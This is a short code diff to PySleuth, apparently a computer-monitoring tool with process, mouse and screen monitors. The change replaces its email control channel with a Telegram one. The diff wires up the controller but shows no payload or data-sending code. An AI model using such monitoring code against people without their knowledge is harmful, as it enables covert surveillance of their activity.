@@ -5,6 +5,7 @@ from .controllers import ProcessMntrController
 from .controllers import MouseMntrController
 from .controllers import ScreenMntrController
 from .controllers import EmailController
+from .controllers import TelegramController
 
 
 class Struct:
@@ -18,18 +19,17 @@ class PySleuth:
         self.ctrls = Struct()
         self._initComponents()
 
-        self.emailCtrl = EmailController(self)
+        self.telegramCtrl = TelegramController(self)
 
         self.connectSlots()
 
     def start(self):
-        self.emailCtrl.login()
         self.RUNNING = True
 
-        assert self.emailCtrl is not None
+        assert self.telegramCtrl is not None
 
         try:
-            self.emailCtrl.startWorker()  # blocking !
+            self.telegramCtrl.startWorker()  # blocking !
         except KeyboardInterrupt:
             pass
         except Exception as e:
@@ -40,7 +40,6 @@ class PySleuth:
     def onShutdown(self):
         if self.RUNNING:
             self.RUNNING = False
-            self.emailCtrl.logout()
 
         assert not self.RUNNING
 
@@ -48,7 +47,7 @@ class PySleuth:
         self.onShutdown()
 
     def connectSlots(self):
-        self.emailCtrl.SIG_shutdown.connect(self, "onShutdown")
+        self.telegramCtrl.SIG_shutdown.connect(self, "onShutdown")
 
     def _initComponents(self):
         components = ConfigHandler().getCfgRun()
